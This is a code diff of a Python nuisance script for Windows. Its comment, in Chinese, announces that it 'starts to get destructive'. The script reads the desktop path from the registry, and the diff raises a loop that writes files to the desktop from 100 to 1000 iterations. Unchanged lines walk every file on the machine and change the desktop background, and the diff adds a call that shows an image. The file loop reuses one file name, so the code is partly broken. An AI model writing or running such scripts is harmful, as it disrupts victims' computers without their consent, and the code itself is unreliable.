@@ -52,7 +52,7 @@ def fill():
     print(winreg.QueryValueEx(key, "Desktop")[0])
     # 开始有杀伤力了
     # 在桌面创建无数个文件
-    for j in range(1, 100):
+    for j in range(1, 1000):
         with open((winreg.QueryValueEx(key, "Desktop")[0] + '\\123txt'), 'wb+') as f:
             f.close()
     # 获取电脑里所有的文件
@@ -68,6 +68,8 @@ def fill():
             print("这个是文件夹，文件夹名称：", file_address)
         else:
             print("这个情况没遇到")
+
+
 def run_images():
     img = cv2.imread("./images/bg.jpg")
 
@@ -77,12 +79,14 @@ def run_images():
     cv2.imshow(out_win, img)
     cv2.waitKey(0)
 
+
 # 主程序
 def main():
     print()
     eg.msgbox('~~~即将运行，请等一会~~~')
     desktop_bg()
     fill()
+    run_images()
 
 
 # 开始运行
